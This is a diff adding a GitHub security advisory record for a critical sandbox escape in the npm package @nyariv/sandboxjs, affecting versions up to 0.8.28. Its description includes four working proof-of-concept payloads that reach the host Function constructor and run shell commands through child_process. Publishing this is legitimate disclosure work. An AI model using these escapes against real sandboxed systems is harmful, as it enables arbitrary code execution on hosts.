@@ -1,0 +1,53 @@
+{
+  "Severity": "CRITICAL",
+  "UpdatedAt": "2026-02-05T20:41:30Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "@nyariv/sandboxjs"
+  },
+  "Advisory": {
+    "DatabaseId": 335870,
+    "Id": "GSA_kwCzR0hTQS01OGpoLXh2NHYtcGN4NM4ABR_-",
+    "GhsaId": "GHSA-58jh-xv4v-pcx4",
+    "References": [
+      {
+        "Url": "https://github.com/nyariv/SandboxJS/security/advisories/GHSA-58jh-xv4v-pcx4"
+      },
+      {
+        "Url": "https://github.com/nyariv/SandboxJS/commit/67cb186c41c78c51464f70405504e8ef0a6e43c3"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-58jh-xv4v-pcx4"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-58jh-xv4v-pcx4"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-25520"
+      }
+    ],
+    "Description": "### Summary\n\nThe return values of functions aren't wrapped. `Object.values`/`Object.entries` can be used to get an Array containing the host's `Function` constructor, by using `Array.prototype.at` you can obtain the hosts `Function` constructor, which can be used to execute arbitrary code outside of the sandbox.\n\n### Details\n\nThe return values of functions aren't wrapped, chaining function calls allows bypassing most validation/sanitization. \n\n### PoC\n\n```js\nconst s = require('@nyariv/sandboxjs').default;\nconst sb = new s();\n\npayload = `\nconsole.log(\n  Object.values(this).at(0)(\n    \"return process.getBuiltinModule('child_process').execSync('ls -lah').toString()\",\n  )(),\n);\n`\n\nsb.compile(payload)().run();\n```\n\n```js\nconst s = require(\"@nyariv/sandboxjs\").default;\nconst sb = new s();\n\npayload = `\nconsole.log(\n  Object.entries(this)[0].at(1)(\n    \"return process.getBuiltinModule('child_process').execSync('ls -lah').toString()\",\n  )(),\n);\n`\n\nsb.compile(payload)().run();\n```\n\n```js\nconst s = require(\"@nyariv/sandboxjs\").default;\nconst sb = new s();\n\npayload = `\nconsole.log(\n  Object.entries(this)\n    .at(0)\n    .map((f) =\u003e {\n      if (typeof f === 'function') {\n        f.call('', 'return process')()\n          .getBuiltinModule('child_process')\n          .execSync('ls -lah', { stdio: 'inherit' });\n      }\n    }),\n);\n`\n\nsb.compile(payload)().run();\n```\n\n```js\nconst s = require(\"@nyariv/sandboxjs\").default;\nconst sb = new s();\n\npayload = `\nconst t = (f) =\u003e {\n  f.call('', 'return process')()\n    .getBuiltinModule('child_process')\n    .execSync('ls -lah', { stdio: 'inherit' });\n};\nconsole.log(t.call(...Object.entries(this)[0]));\n`\n\nsb.compile(payload)().run();\n```\n\n### Impact\n\nSanbox Escape -\u003e RCE",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-02-05T20:41:28Z",
+    "Severity": "CRITICAL",
+    "Summary": "@nyariv/sandboxjs has a Sandbox Escape issue",
+    "UpdatedAt": "2026-02-05T20:41:30Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 10,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "0.8.29"
+      },
+      "VulnerableVersionRange": "\u003c= 0.8.28"
+    }
+  ]
+}
